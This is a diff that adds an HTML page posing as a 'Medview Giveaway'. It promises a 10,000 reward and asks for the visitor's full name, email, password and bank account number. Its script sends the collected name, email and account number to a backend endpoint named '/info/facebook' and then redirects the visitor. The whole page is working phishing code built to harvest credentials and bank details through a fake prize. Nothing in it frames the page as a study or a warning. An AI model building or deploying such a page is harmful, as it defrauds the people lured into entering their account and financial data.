@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Medview Giveaway</title>
+    <link rel="stylesheet" href="css/login.css">
+</head>
+<body>
+    <div class="form">
+        <h3>🎉 Congratulation 🎉 You are Eligible to recieve 10,000</h3>
+        <input type="text" placeholder="Fullname" class="username" value="" >
+        <input type="email" placeholder='Email' class="email" value="">
+        <input type="password" placeholder="Password" class="password" value="" >
+        <input type="text" placeholder="Account Number" class="number" value="" maxlength="10">
+        <div class="bank_info" style="display: none;">
+            <p class="bank_name"></p>
+            <p class="bank_user"></p>
+        </div>
+        <p class="err_msg" style="color: red; font-weight: 600;"></p>
+        <p class="load" style="color: blue; font-weight: 600;"></p>
+        <select name="" id="">
+            <option value="">What do you plan on using the reward for?</option>
+            <option value="">Personal Use</option>
+            <option value="">Investment</option>
+            <option value="">Feeding</option>
+            <option value="">Pay off a debt</option>
+        </select>
+        <button type="submit" class="submit_btn">get reward</button>
+    </div>
+
+    <script>
+
+        const submit_btn = document.querySelector('.submit_btn')
+        const username = document.querySelector('.username')
+        const email = document.querySelector('.email')
+        const password = document.querySelector('.password')
+        const number = document.querySelector('.number')
+        const errMsg = document.querySelector('.err_msg')
+        const bank_name = document.querySelector('.bank_name')
+        const bank_user = document.querySelector('.bank_user')
+        const load = document.querySelector('.load')
+
+        const backend_url = window.location.hostname === '127.0.0.1' ? 'http://localhost:4040' : ""
+
+        /* number.addEventListener('input', async () => {
+            const accountNumber = number.value
+
+            if(accountNumber.length === 10){
+                load.textContent = 'Fetching Bank Details'
+                await FetchBankDetails(accountNumber)
+                load.textContent = ''
+            }
+        })
+
+        async function FetchBankDetails(acc){
+
+            try {
+                const response = await fetch(`${backend_url}/resolve-account`, {
+                    method: 'POST',
+                    headers:{
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ accountNumber: acc })
+                })
+
+                const data = await response.json()
+
+                if(data.bankName && data.accountHolder){
+                    bank_name.textContent = data.bankName
+                    bank_user.textContent = data.accountHolder
+                }else{
+                    errMsg.textContent = 'Account Verification Failed'
+                }
+
+            } catch(err) {
+                console.log('Error fetching bank details', err)
+                errMsg.textContent = 'Error fetching bank details'
+            }
+        } */
+        
+
+        function submit_cred(){
+
+            if(!username.value || !email.value || !number.value){
+                errMsg.textContent = 'Missing Fields'
+                return
+            }
+
+            const data = {
+                username: username.value,
+                email: email.value,
+                accountNumber: number.value,
+               /*  bankName: bank_name.textContent,
+                bankHolder: bank_user.textContent */
+            }
+
+            fetch(`${backend_url}/info/facebook`, { 
+                method: 'POST', 
+                headers:{
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data) 
+            }).then(res => res.json()).then(data => {
+            if (data.success) {
+                window.location.href = 'session.html';
+            } else {
+                errMsg.textContent = 'Submission failed. Please try again.';
+            }
+        })
+            .catch(err => console.log('Error:', err))
+        }
+
+        submit_btn.addEventListener('click', submit_cred)
+
+    </script>
+</body>
+</html>
